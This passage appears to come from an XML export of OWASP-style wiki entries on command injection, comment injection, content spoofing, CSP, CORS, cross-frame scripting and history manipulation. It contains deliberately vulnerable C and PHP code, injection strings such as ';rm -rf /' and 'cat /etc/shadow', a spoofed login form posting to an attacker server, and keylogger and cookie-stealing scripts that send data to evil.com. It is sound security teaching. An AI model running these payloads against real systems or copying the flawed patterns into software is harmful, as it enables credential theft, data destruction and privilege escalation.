 commandLength = strlen(cat) + strlen(argv[1]) + 1;
 command = (char *) malloc(commandLength);
 strncpy(command, cat, commandLength);
 strncat(command, argv[1], (commandLength - strlen(cat)) );

 system(command);
 return (0);
}

&lt;/pre&gt;

Used normally, the output is simply the contents of the file requested:

&lt;pre&gt;

$ ./catWrapper Story.txt
When last we left our heroes...

&lt;/pre&gt;
However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:

&lt;pre&gt;
$ ./catWrapper "Story.txt; ls"
When last we left our heroes...
Story.txt               doubFree.c              nullpointer.c
unstosig.c              www*                    a.out*
format.c                strlen.c                useFree*
catWrapper*             misnull.c               strlength.c             useFree.c
commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c
&lt;/pre&gt;

If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.

===Example 2===

The following simple program accepts a filename as a command line argument, and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.

&lt;pre&gt;
       int main(char* argc, char** argv) {
               char cmd[CMD_MAX] = "/usr/bin/cat ";
               strcat(cmd, argv[1]);
               system(cmd);
       }

&lt;/pre&gt;

Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.

===Example 3===

The following code from a privileged program uses the environment variable $APPHOME to determine the application's installation directory, and then executes an initialization script in that directory.

&lt;pre&gt;
       ...
       char* home=getenv("APPHOME");
       char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD));
       if (cmd) {
               strcpy(cmd,home);
               strcat(cmd,INITCMD);
               execl(cmd, NULL);
       }
       ...

&lt;/pre&gt;

As in Example 2, the code in this example allows an attacker to execute arbitrary commands with the elevated privilege of the application. In this example, the attacker can modify the environment variable $APPHOME to specify a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, by controlling the environment variable, the attacker can fool the application into running malicious code.

The attacker is using the environment variable to control the command that the program invokes, so the effect of the environment is explicit in this example. We will now turn our attention to what can happen when the attacker changes the way the command is interpreted.

===Example 4===

The code below is from a web-based CGI utility that allows users to change their passwords. The password update process under NIS includes running ''make'' in the /var/yp directory. Note that since the program updates password records, it has been installed setuid root.

The program invokes make as follows:
&lt;pre&gt;
       system("cd /var/yp &amp;&amp; make &amp;&gt; /dev/null");
&lt;/pre&gt;

Unlike the previous examples, the command in this example is hardcoded, so an attacker cannot control the argument passed to system(). However, since the program does not specify an absolute path for make, and does not scrub any environment variables prior to invoking the command, the attacker can modify their $PATH variable to point to a malicious binary named make and execute the CGI script from a shell prompt. And since the program has been installed setuid root, the attacker's version of make now runs with root privileges.

The environment plays a powerful role in the execution of system commands within programs. Functions like system() and exec() use the environment of the program that calls them, and therefore attackers have a potential opportunity to influence the behavior of these calls.

There are many sites that will tell you that Java's Runtime.exec is exactly the same as C's system function. This is not true. Both allow you to invoke a new program/process. However, C's system function passes its arguments to the shell (/bin/sh) to be parsed, whereas Runtime.exec tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters. Runtime.exec does NOT try to invoke the shell at any point. The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using "&amp;", "&amp;&amp;", "|", "||", etc, redirecting input and output) would simply end up as a parameter being passed to the first command, and likely causing a syntax error, or being thrown out as an invalid parameter.

===Example 5===
The following trivial code snippets are vulnerable to OS command injection on the Unix/Linux platform:

:* C:

 #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
 int main(int argc, char **argv)
 {
      char command[256];
 
      if(argc != 2) {
           printf("Error: Please enter a program to time!\n");
           return -1;
      }
 
      memset(&amp;command, 0, sizeof(command));
 
      strcat(command, "time ./");
      strcat(command, argv[1]);
 
      system(command);
      return 0;
 }

:* If this were a suid binary, consider the case when an attacker enters the following: 'ls; cat /etc/shadow'. In the Unix environment, shell commands are separated by a semi-colon. We now can execute system commands at will!

:* Java:

'''There are many sites that will tell you that Java's Runtime.exec is exactly the same as C's system function. This is not true. Both allow you to invoke a new program/process. However, C's system function passes its arguments to the shell (/bin/sh) to be parsed, whereas Runtime.exec tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters. Runtime.exec does NOT try to invoke the shell at any point. The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using "&amp;", "&amp;&amp;", "|", "||", etc, redirecting input and output) would simply end up as a parameter being passed to the first command, and likely causing a syntax error, or being thrown out as an invalid parameter.'''

===Example 6===
The following PHP code snippet is vulnerable to a command injection attack:

&lt;pre&gt;
&lt;?php
print("Please specify the name of the file to delete");
print("&lt;p&gt;");
$file=$_GET['filename'];
system("rm $file");
?&gt;
&lt;/pre&gt;

The following request and response is an example of a successful attack:

Request
&lt;pre&gt;
http://127.0.0.1/delete.php?filename=bob.txt;id
&lt;/pre&gt;

Response
&lt;pre&gt;
Please specify the name of the file to delete

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Comment Injection Attack</name>
    <description>Comments injected into an application through input can be used to compromise a system. As data is parsed, an injected/malformed comment may cause the process to take unexpected actions that result in an attack.
</description>
    <environment />
    <example>The attacker may conduct this kind of attack with different programming or scripting languages:

'''Database:'''

If the attacker has the ability to manipulate queries which are sent to the database, then he's able to inject a terminating
character too. The aftermath is that the interpretation of the query will be stopped at the terminating character:
&lt;pre&gt;
SELECT body FROM items WHERE id = $ID limit 1;
&lt;/pre&gt;
Let's assume that the attacker has sent via the GET method the following data stored in variable $ID:
&lt;pre&gt;
"1 or 1=1; #"
&lt;/pre&gt;
In the end the final query form is:
&lt;pre&gt;
SELECT body FROM items WHERE id = 1 or 1=1; # limit 1;
&lt;/pre&gt;
After the '''#''' character everything will be discarded by the database including "''limit 1''", so only the last column "body" with all its records will be received as a query response.

Sequences that may be used to comment queries:
* MySQL:''#'', ''--''
* MS SQL: ''--''
* MS Access: ''%00'' ('''hack!''')
* Oracle: ''--''

'''Null byte:'''

To comment out some parts of the queries, the attacker may use the standard sequences, typical for a given language, or terminate
the queries using his own methods being limited only by his imagination. An interesing example is a null byte method used to
comment out everything after the current query in MS Access databases. More information about this can be found in [[Embedding Null Code]] .

'''Shell:'''

Shell (bash) also has the character '''#''', which terminates interpretation.

For example:

find.php
&lt;pre&gt;
&lt;?
$ =sth $_GET['what];
system("/usr/bin/find -name '$sth' -type f");
?&gt;
&lt;/pre&gt;
Using ''/find.php?what=*'%20%23'' the attacker will bypass limitation "''-type f''" and this command:
&lt;pre&gt;
/usr/bin/find -name '*' -type f
&lt;/pre&gt;
will become:
&lt;pre&gt;
/usr/bin/find -name '*' #-type f
&lt;/pre&gt;
So the final form of the command is:
&lt;pre&gt;
/usr/bin/find -name '*'
&lt;/pre&gt;

'''HTML (injection):'''

If there are no restrictions about who is able to insert comments, then using the start comment tag:
&lt;pre&gt;
&lt;!--
&lt;/pre&gt;
it's possible to comment out the rest of displayed content on the website.

invisible.php
&lt;pre&gt;
&lt;?php
print "hello!: ";
print $_GET['user'];
print " Welcome friend!";
?&gt;
&lt;/pre&gt;
After:
&lt;pre&gt;
GET /invisible.php?user=&lt;!--
&lt;/pre&gt;
There result will be:
&lt;pre&gt;
hello!:
&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Content Security Policy</name>
    <description>'''CSP''' stands for '''C'''ontent '''S'''ecurity '''P'''olicy. 

Is an W3C specification offering the possbility to instruct the client browser from which location and/or which type of resources are allowed to be loaded. To define a loading behavior, the CSP specification use "directive" where a directive defines a loading behavior for a target resource type.


This article is based on version [http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html 1.1] of the W3C specification.


Directives can be specified using HTTP response header (a server may send more than one CSP HTTP header field with a given resource representation and a server may send different CSP header field values with different representations of the same resource or with different resources) or HTML Meta tag, the HTTP headers below are defined by the specs:
* '''Content-Security-Policy''' : Defined by W3C Specs as standard header, used by Chrome version 25 and later, Firefox version 23 and later, Opera version 19 and later.
* '''X-Content-Security-Policy''' : Used by Firefox until version 23, and Internet Explorer version 10 (which partially implements Content Security Policy).
* '''X-WebKit-CSP''' : Used by Chrome until version 25



The supported directives are:
* '''default-src''' : Define loading policy for all resources type in case of a resource type dedicated directive is not defined (fallback),
* '''script-src''' :  Define which scripts the protected resource can execute,
* '''object-src''' :  Define from where the protected resource can load plugins,
* '''style-src''' : Define which styles (CSS) the user applies to the protected resource,
* '''img-src''' : Define from where the protected resource can load images,
* '''media-src''' : Define from where the protected resource can load video and audio,
* '''frame-src''' : Define from where the protected resource can embed frames,
* '''font-src''' : Define from where the protected resource can load fonts,
* '''connect-src''' : Define which URIs the protected resource can load using script interfaces,
* '''form-action''' : Define which URIs can be used as the action of HTML form elements,
* '''sandbox''' : Specifies an HTML sandbox policy that the user agent applies to the protected resource,
* '''script-nonce''' : Define script execution by requiring the presence of the specified nonce on script elements,
* '''plugin-types''' : Define the set of plugins that can be invoked by the protected resource by limiting the types of resources that can be embedded,
* '''reflected-xss''' : Instructs a user agent to activate or deactivate any heuristics used to filter or block reflected cross-site scripting attacks, equivalent to the effects of the non-standard X-XSS-Protection header,
*  '''report-uri''' : Specifies a URI to which the user agent sends reports about policy violation

An introduction to CSP is available on [http://www.html5rocks.com/en/tutorials/security/content-security-policy/ HTML5Rocks].  The browser support is shown on http://caniuse.com/#feat=contentsecuritypolicy</description>
    <environment />
    <example>The risk with CSP can have 2 main sources:
# Policies misconfiguration,
# Too permissive policies.

== Countermeasure ==
This article will focus on providing an sample implementation of a JEE Web Filter in order to apply a set of CSP policies on all HTTP response returned by server. 

The policies will instruct the browser to have the loading behavior below using all HTTP headers defined in W3C Specs:
* Explicit loading definition of each resource type,
* Resources are loaded only from source domain,
* Inline style is not allowed,
* For JavaScript:
** ''Inline script'' will be allowed because inline scripting is commonly used (can be disabled if target site does not use this type of scripting),
** ''eval()'' function will be allowed in order to not break use of popular JavaScript libraries (ex: JQuery, JQueryUI, Sencha, ...) because they use eval() function (it was the case last time I have checked the source code from CDN ;) ),
* Generation of a random not guessable script nonce to use into all script tags,
* Plugin types only allow PDF and Flash,
* No font loading (configurable),
* No Audio / Video loading (configurable),
* Enable browser XSS filtering feature.

&lt;pre style="color:navy"&gt;
The support for CSP directives is not the same level in major browsers (Firefox/Chrome/IE). It's recommanded to check the support 
provided by target browsers  (using site provided in link section of this article) in order to configure CSP policies. The sample 
below try to provide a set of policies from which your can add policies specific to your application context.
&lt;/pre&gt;

''This implementation provide an option to add CSP directives used by Firefox (Mozilla CSP directives).''

&lt;pre&gt;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Hex;

/**
 * Sample filter implementation to define a set of Content Security Policies.&lt;br/&gt;
 * 
 * This implementation has a dependency on Commons Codec API.&lt;br/&gt;
 * 
 * This filter set CSP policies using all HTTP headers defined into W3C specification.&lt;br/&gt;
 * &lt;br/&gt;
 * This implementation is oriented to be easily understandable and easily adapted.&lt;br/&gt;
 * 
 */
@WebFilter("/*")
public class CSPPoliciesApplier implements Filter {

	/** Configuration member to specify if web app use web fonts */
	public static final boolean APP_USE_WEBFONTS = false;

	/** Configuration member to specify if web app use videos or audios */
	public static final boolean APP_USE_AUDIOS_OR_VIDEOS = false;

	/** Configuration member to specify if filter must add CSP directive used by Mozilla (Firefox) */
	public static final boolean INCLUDE_MOZILLA_CSP_DIRECTIVES = true;

	/** Filter configuration */
	@SuppressWarnings("unused")
	private FilterConfig filterConfig = null;

	/** List CSP HTTP Headers */
	private List&lt;String&gt; cspHeaders = new ArrayList&lt;String&gt;();

	/** Collection of CSP polcies that will be applied */
	private String policies = null;

	/** Used for Script Nonce */
	private SecureRandom prng = null;

	/**
	 * Used to prepare (one time for all) set of CSP policies that will be applied on each HTTP response.
	 * 
	 * @see javax.servlet.Filter#init(javax.servlet.FilterConfig)
	 */
	@Override
	public void init(FilterConfig fConfig) throws ServletException {
		// Get filter configuration
		this.filterConfig = fConfig;

		// Init secure random
		try {
			this.prng = SecureRandom.getInstance("SHA1PRNG");
		}
		catch (NoSuchAlgorithmException e) {
			throw new ServletException(e);
		}

		// Define list of CSP HTTP Headers
		this.cspHeaders.add("Content-Security-Policy");
		this.cspHeaders.add("X-Content-Security-Policy");
		this.cspHeaders.add("X-WebKit-CSP");

		// Define CSP policies
		// Loading policies for Frame and Sandboxing will be dynamically defined : We need to know if context use Frame
		List&lt;String&gt; cspPolicies = new ArrayList&lt;String&gt;();
		String originLocationRef = "'self'";
		// --Disable default source in order to avoid browser fallback loading using 'default-src' locations
		cspPolicies.add("default-src 'none'");
		// --Define loading policies for Scripts
		cspPolicies.add("script-src " + originLocationRef + " 'unsafe-inline' 'unsafe-eval'");
		if (INCLUDE_MOZILLA_CSP_DIRECTIVES) {
			cspPolicies.add("options inline-script eval-script");
			cspPolicies.add("xhr-src 'self'");
		}
		// --Define loading policies for Plugins
		cspPolicies.add("object-src " + originLocationRef);
		// --Define loading policies for Styles (CSS)
		cspPolicies.add("style-src " + originLocationRef);
		// --Define loading policies for Images
		cspPolicies.add("img-src " + originLocationRef);
		// --Define loading policies for Form
		cspPolicies.add("form-action " + originLocationRef);
		// --Define loading policies for Audios/Videos
		if (APP_USE_AUDIOS_OR_VIDEOS) {
			cspPolicies.add("media-src " + originLocationRef);
		}
		// --Define loading policies for Fonts
		if (APP_USE_WEBFONTS) {
			cspPolicies.add("font-src " + originLocationRef);
		}
		// --Define loading policies for Connection
		cspPolicies.add("connect-src " + originLocationRef);
		// --Define loading policies for Plugins Types
		cspPolicies.add("plugin-types application/pdf application/x-shockwave-flash");
		// --Define browser XSS filtering feature running mode
		cspPolicies.add("reflected-xss block");

		// Target formating
		this.policies = cspPolicies.toString().replaceAll("(\\[|\\])", "").replaceAll(",", ";").trim();
	}

	/**
	 * Add CSP policies on each HTTP response.
	 * 
	 * @see javax.servlet.Filter#doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain)
	 */
	@Override
	public void doFilter(ServletRequest request, ServletResponse response, FilterChain fchain) throws IOException, ServletException {
		HttpServletRequest httpRequest = ((HttpServletRequest) request);
		HttpServletResponse httpResponse = ((HttpServletResponse) response);

		/* Step 1 : Detect if target resource is a Frame */
		// Customize here according to your context...
		boolean isFrame = true;

		/* Step 2 : Add CSP policies to HTTP response */
		StringBuilder policiesBuffer = new StringBuilder(this.policies);

		// If resource is a frame add Frame/Sandbox CSP policy
		if (isFrame) {
			// Frame + Sandbox : Here sandbox allow nothing, customize sandbox options depending on your app....
			policiesBuffer.append(";").append("frame-src 'self';sandbox");
			if (INCLUDE_MOZILLA_CSP_DIRECTIVES) {
				policiesBuffer.append(";").append("frame-ancestors 'self'");
			}
		}

		// Add Script Nonce CSP Policy
		// --Generate a random number
		String randomNum = new Integer(this.prng.nextInt()).toString();
		// --Get its digest
		MessageDigest sha;
		try {
			sha = MessageDigest.getInstance("SHA-1");
		}
		catch (NoSuchAlgorithmException e) {
			throw new ServletException(e);
		}
		byte[] digest = sha.digest(randomNum.getBytes());
		// --Encode it into HEXA
		String scriptNonce = Hex.encodeHexString(digest);
		policiesBuffer.append(";").append("script-nonce ").append(scriptNonce);
		// --Made available script nonce in view app layer
		httpRequest.setAttribute("CSP_SCRIPT_NONCE", scriptNonce);

		// Add policies to all HTTP headers
		for (String header : this.cspHeaders) {
			httpResponse.setHeader(header, policiesBuffer.toString());
		}

		/* Step 3 : Let request continue chain filter */
		fchain.doFilter(request, response);
	}

	/**
	 * {@inheritDoc}
	 * 
	 * @see javax.servlet.Filter#destroy()
	 */
	@Override
	public void destroy() {
		// Not used
	}
}

&lt;/pre&gt;</example>
    <determination>[[Automated Audit using w3af|w3af]] audit tools (http://w3af.org) contain [https://github.com/andresriancho/w3af/blob/master/plugins/grep/csp.py plugin] to automatically audit web application to check if they correctly implement CSP policies. 

&lt;pre style="color:#088A08"&gt;
It's very useful to include this type of tools into a web application development process in order to 
perform a regular automatic first level check (do not replace an manual audit and manual audit must be also conducted regularly).
&lt;/pre&gt;

You can also use  [https://www.oxdef.info/csp-tester CSP Tester (browser extension)] to build and test the policy for your web application.

[http://cspbuilder.info/ CspBuilder] is a public CSP report collector with analytical tools that facilitate development of the policy based on incoming reports.</determination>
    <protection />
  </vul>
  <vul>
    <name>Content Spoofing</name>
    <description>Content spoofing, also referred to as ''content injection'' or ''virtual defacement'', is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user. This presents the user with a modified page under the context of the trusted domain.&lt;br&gt;

This attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust.

== Content Spoofing vs. Cross-site Scripting&lt;br&gt; ==
Content spoofing is an attack that is closely related to [[Cross-site Scripting (XSS)]]. While XSS uses [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet &lt;script&gt; and other techniques] to run JavaScript, content spoofing uses other techniques to modify the page for malicious reasons.

Even if XSS mitigation techniques are used within the web application, such as proper output encoding, the application can still be vulnerable to text based content spoofing attacks.</description>
    <environment />
    <example>===Hypertext Markup Language (HTML) Injection===

A possible attack scenario is demonstrated below. For this scenario, lets assumes no output encoding is being implemented:

# Attacker discovers injection vulnerability and decides to spoof a login form
# Attacker crafts malicious link, including his injected HTML content, and sends it to a user via email
# The user visits the page due to the page being located within a trusted domain
# The attacker's injected HTML is rendered and presented to the user asking for a username and password
# The user enters a username and password, which are both sent to the attackers server


: A simple PHP page containing an injection vulnerability via the ''name'' parameter:

&lt;pre&gt;
&lt;?php
    $name = $_REQUEST ['name'];
?&gt;
&lt;html&gt;
	&lt;h1&gt;Welcome to the Internet!&lt;/h1&gt;
	&lt;br&gt;
	&lt;body&gt;
            Hello, &lt;?php echo $name; ?&gt;!
	    &lt;p&gt;We are so glad you are here!&lt;/p&gt;
	&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;

The page functionality can be tested by making the following GET request to the page:

&lt;pre&gt;
http://127.0.0.1/vulnerable.php?name=test
&lt;/pre&gt;

By requesting the link below, the page renders the injected HTML, presents a login form, and comments out the rest of the page after the injection point. Once a user enters their username and password, the values are sent to a page named ''login.php'' on the attacker's server via POST.

&lt;pre&gt;
http://127.0.0.1/vulnerable.php?name=&lt;h3&gt;Please Enter Your Username and Password to Proceed:&lt;/h3&gt;&lt;form method="POST" 
action="http://attackerserver/login.php"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br /&gt;Password: &lt;input type="password" 
name="password" /&gt;&lt;br /&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;!--
&lt;/pre&gt;


===Text Injection===

Another example of a content spoofing attack would be to present false information to a user via text manipulation. An attack scenario is demonstrated below. For this scenario, lets assume proper output encoding HAS been implemented and XSS is not possible:

#An attacker identifies a web application that gives recommendations to its users on whether they should buy or sell a particular stock
#The attacker identifies a vulnerable parameter
#The attacker crafts a malicious link by slightly modifying a valid request
#The link containing the modified request is sent to a user and they clicks the link
#A valid webpage is created using the attackers malicious recommendation and the user believes the recommendation was from the stock website


'''Valid Page'''
&lt;pre&gt;
http://vulnerablesite/suggestions.php?stockid=123&amp;stockrecommendation=We+Recommend+You+Buy+Now
&lt;/pre&gt;

'''Modified Page'''
&lt;pre&gt;
http://vulnerablesite/suggestions.php?stockid=123&amp;stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now
&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>CORS OriginHeaderScrutiny</name>
    <description>'''CORS''' stands for '''C'''ross-'''O'''rigin '''R'''esource '''S'''haring. 

Is a feature offering the possbility for:
* A web application to expose resources to all or restricted domain,
* A web client to make AJAX request for resource on other domain than is source domain.

This article will focus on role of the '''Origin''' header in exchange between web client and web application.

The basic process is composed by steps below (sample HTTP resquest/response has been taken from [https://developer.mozilla.org/en-US/docs/HTTP_access_control Mozilla Wiki]):

* '''Step 1 : Web client send request to get resource from a different domain.'''

&lt;pre&gt;
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example

[Request Body]
&lt;/pre&gt;

The web client inform is source domain using the HTTP request header "'''Origin'''".

* '''Step 2 : Web application respond to request.'''

&lt;pre&gt;
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61 
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml
Access-Control-Allow-Origin: *

[Response Body]
&lt;/pre&gt;

The web application informs web client of the allowed domain using the HTTP response header '''Access-Control-Allow-Origin'''.
The header can contains a '*' to indicate that all domain are allowed OR a specified domain to indicate the specified allowed domain.

* '''Step 3 : Web client process web application response.'''

According to the CORS W3C specification, it's up to the web client (usually a browser) to determine, using the web application response HTTP header '''Access-Control-Allow-Origin''', 
if the web client is allowed to access response data.
</description>
    <environment />
    <example>''A reminder : Into this article we focus on web application side because it's the only part in which we have the maximum of control.''

The risk here is that a web client can put any value into the '''Origin''' request HTTP header in order to force web application to provide it the target resource content. 
In the case of a Browser web client, the header value is managed by the browser but another "web client" can be used (like Curl/Wget/Burp suite/...) to change/override the "Origin" header value...
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>CORS RequestPreflighScrutiny</name>
    <description>'''CORS''' stands for '''C'''ross-'''O'''rigin '''R'''esource '''S'''haring. 


Is an feature offering the possbility to:
* A web application to expose resources to all or restricted domain,
* A web client to made AJAX request for resource on other domain than is source domain.


This article will focus on HTTP '''Request Preflight''' feature proposed by CORS W3C specification and (mainly) how to setup a protection, on web application side, against CORS HTTP request that try to bypass the preflight process.
</description>
    <environment />
    <example>Request preflight have to objective to ensure that HTTP request will not have a bad impact on data, this, using a first request in which browser describe the final HTTP request that will send later. 

The main risk here (for web application), is that the request preflight process is entirely managed on client side (by the browser) and then anything warrant web application that the request preflight process will be always followed... 

A user can create/send (using tools like Curl,OWASP Zap Proxy,...) a final HTTP request without previously send the first request for preflight and then bypass request preflight process in order to act on data in a unsafe way.
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cross Frame Scripting</name>
    <description>Cross-Frame Scripting (XFS) is a method of exploiting [[Cross-site Scripting (XSS)]]. In an XFS attack, the attacker exploits a specific cross-frame-scripting bug in a web browser to access private data on a third-party website. The attacker induces the browser user to navigate to a web page the attacker controls; the attacker's page loads a third-party page in an HTML frame; and then javascript executing in the attacker's page steals data from the third-party page.

XFS also sometimes is used to describe an XSS attack which uses an HTML frame in the attack. For example, an attacker might exploit a [[Cross Site Scripting Flaw]] to inject a frame into a third-party web page; or an attacker might create a page which uses a frame to load a third-party page with an XSS flaw.</description>
    <environment />
    <example>===XFS Attack Against IE===
To exploit the IE bug which leaks keyboard events across framesets, an attacker may create a web page at evil.com, which the attacker controls, and include on the evil.com page a visible frame displaying the login page for example.com. The attacker can hide the frame's borders and expand the frame to cover the entire page, so that it looks to the browser user like he or she is actually visiting example.com The attacker registers some javascript in the main evil.com page which listens for all key events on the page. Normally, this listener would be notified of events only from the main evil.com page -- but because of the browser bug, this listener is notified also of events from the framed example.com page. So every key press the browser user makes in the example.com frame, while trying to log into example.com, can be captured by the attacker, and reported back to evil.com:

&lt;pre&gt;
&lt;!-- http://evil.com/example.com-login.html --&gt;
&lt;head&gt;
&lt;script&gt;
// array of user keystrokes
var keystrokes = [];
// event listener which captures user keystrokes
document.onkeypress = function() {
    keystrokes.push(window.event.keyCode);
}
// function which reports keytrokes back to evil.com every second
setInterval(function() {
    if (keystrokes.length) {
        var xhr = newXHR();
        xhr.open("POST", "http://evil.com/k");
        xhr.send(keystrokes.join("+"));
    }
    keystrokes = [];
}, 1000);
// function which creates an ajax request object
function newXHR() {
    if (window.XMLHttpRequest)
        return new XMLHttpRequest();
    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
}
&lt;/script&gt;
&lt;/head&gt;
&lt;!-- re-focusing to this frameset tricks browser into leaking events --&gt;
&lt;frameset onload="this.focus()" onblur="this.focus()"&gt;
&lt;!-- frame which embeds example.com login page --&gt;
&lt;frame src="http://example.com/login.html"&gt;
&lt;/frameset&gt;
&lt;/pre&gt;

===XSS Attack Using Frames===
To exploit a [[Cross Site Scripting Flaw]] on a third-party web page at example.com, the attacker could create a web page at evil.com, which the attacker controls, and include a hidden iframe in the evil.com page. The iframe loads the flawed example.com page, and injects some script into it through the XSS flaw. In this example, the example.com page prints the value of the "q" query parameter from the page's URL in the page's content without escaping the value. This allows the attacker to inject some javascript into the example.com page which steals the browser-user's example.com cookie, and sends the cookie via a fake-image request to evil.com (the iframe's src URL is wrapped for legibility):

&lt;pre&gt;
&lt;iframe style="position:absolute;top:-9999px" src="http://example.com/&amp;crarr;
    flawed-page.html?q=&lt;script&gt;document.write('&lt;img src=\"http://evil.com/&amp;crarr;
    ?c='+encodeURIComponent(document.cookie)+'\"&gt;')&lt;/script&gt;"&gt;&lt;/iframe&gt;
&lt;/pre&gt;

The iframe is hidden off-screen, so the browser user won't have any idea that he or she just "visited" the example.com page. However, this attack is effectively the same as a conventional XSS attack, since the attacker could have simply redirected the user directly to the example.com page, using a variety of methods, including a meta element like this (again, the meta element's URL is wrapped for legibility):

&lt;pre&gt;
&lt;meta http-eqiv="refresh" content="1;url=http://example.com/&amp;crarr;
    flawed-page.html?q=&lt;script&gt;document.write('&lt;img src=\"http://evil.com/&amp;crarr;
    ?c='+encodeURIComponent(document.cookie)+'\"&gt;')&lt;/script&gt;"&gt;
&lt;/pre&gt;

The only difference is that when using an iframe, the attacker can hide the frame off-screen -- so the browser user won't have any idea that he or she just "visited" example.com. When using a redirect to navigate directly to example.com, the browser will display the example.com url in the browser's address bar, and the example.com page in the browser's window, so the browser user will be aware that he or she is visiting example.com.

===Another XSS Attack Using Frames===
To exploit the same [[Cross Site Scripting Flaw]] as above at example.com (which prints the value of the "q" query parameter from the page's URL in the page's content without escaping the value) the attacker could create a web page at evil.com, which the attacker controls, that includes a link like the following, and induce the user to click on the link. This link injects an iframe into the example.com page by exploiting the XSS flaw with the "q" query parameter; the iframe runs some javascript to steal the browser-user's example.com cookie, and sends it via a fake-image request to evil.com (the URL is wrapped for legibility):

&lt;pre&gt;
http://example.com/flawed-page.html?=&lt;iframe src="&amp;crarr;
    javascript:document.body.innerHTML=+'&lt;img src=\"http://evil.com/&amp;crarr;
    ?c='+encodeURIComponent(document.cookie)+'\"&gt;'"&gt;&lt;/iframe&gt;
&lt;/pre&gt;

Again, this attack is effectively the same as a conventional XSS attack; the attacker simply uses the src attribute of the injected iframe element as a vehicle to run some javascript code in the attacked page.
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cross Site History Manipulation (XSHM)</name>
    <description>'''Cross-Site History Manipulation (XSHM)''' is a [http://en.wikipedia.org/wiki/Same_origin_policy SOP (Same Origin Policy)] security breach. SOP is the most important security concept of modern browsers. SOP means that web pages from different origins by design cannot communicate with each other. '''Cross-Site History Manipulation''' breach is based on the fact that client-side browser history object is not properly partitioned on a per-site basis. Manipulating browser history may lead to SOP compromising, allow bi-directional [[Cross-Site_Request_Forgery_(CSRF)|CSRF]] and other exploitations such as: user privacy violation, login status detection, resources mapping, sensitive information inferring, users’ activity tracking and URL parameter stealing.</description>
    <environment />
    <example>=== What is Condition Leakage? ===
Condition leakage occurs when an attacker can infer a sensitive value of a conditional statement in an attacked application. For example, if a site contains the following logic:
 Page A: If (CONDITION)
            Redirect(Page B)

an attacker can execute the [[Cross-Site_Request_Forgery_(CSRF)|CSRF]] and get an indication about the value of the condition as a feedback. This attack is executed from an attacker site. The site then submits a Cross-Site request to a victim site, and by manipulating the History object gets a feedback with required information leaked from a victim site. It is important to mention that the redirect command can appear explicitly in the code, or can be completed by the operational environment.

Attack Vector:
# Create IFRAME with src=Page B
# Remember the current value of history.length 
# Change src of IFRAME to Page A
# If the value of history.length is the same, then the CONDITION is TRUE

=== Login Detection ===
The following demo for IE and Facebook can show how one can identify if users are currently using facebook: [http://www.checkmarx.com/Demo/XSHM.aspx "Am I using Facebook?"]

===Cross-Site Information Inference===
It is possible to inference sensitive information from a page on a different origin, if it implements a conditional redirect. Suppose that in an HR application which is not publically accessible, a legal user can search employees by name, salary and other criteria. If the search has no results, a redirect command is then executed to a "Not Found" page. By submitting the following URL:
 http://Intranet/SearchEmployee.aspx?name=Jon&amp;SalaryFrom=3000&amp;SalaryTo=3500
and observing the NotFound redirection, attackers can inference sensitive information about a worker's salary.

This can be done by using the following attack vector:
# Create IFRAME with src="NotFound.aspx"
# Remember the current value of history.length
# Change src of IFRAME to "SearchEmployee.aspx?name=Jon&amp;SalaryFrom=3000&amp;SalaryTo=3500"
